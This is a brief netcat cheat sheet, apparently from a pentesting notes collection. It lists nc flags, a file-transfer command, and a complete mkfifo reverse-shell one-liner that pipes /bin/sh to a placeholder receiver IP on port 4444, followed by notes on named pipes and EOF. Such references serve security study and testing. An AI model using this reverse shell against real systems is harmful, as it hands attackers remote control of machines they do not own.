# Netcat

```text
-n numeric IP-address only (skip DNS name resolution)
-v verbose
-l listening
-p port
-u UDP
-c, --sh-exec <command> Executes the given command via /bin/sh
-e, --exec <command> Executes the given command
-q0 quit after 0 seconds
```

When you use the `-q0` flag, `netcat` will close the connection as soon it detects the end of your file.

```text
nc -q0 -l -p 4444 < file.txt
```

Send Reverse Shell with `mkfifo`

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc <receiver_ip> 4444 > /tmp/f
```

{% embed url="https://unix.stackexchange.com/questions/139490/continuous-reading-from-named-pipe-cat-or-tail-f" %}

* `cat` keeps reading until it gets `EOF`. 
* A pipe produces `EOF` on the output only when it gets `EOF` on the input. 
* The logging daemon is opening the file, writing to it, and keeping it open — just like it does for a regular file — so `EOF` is never generated on the output. 
* `cat` just keeps reading, blocking whenever it exhausts what's currently in the pipe.



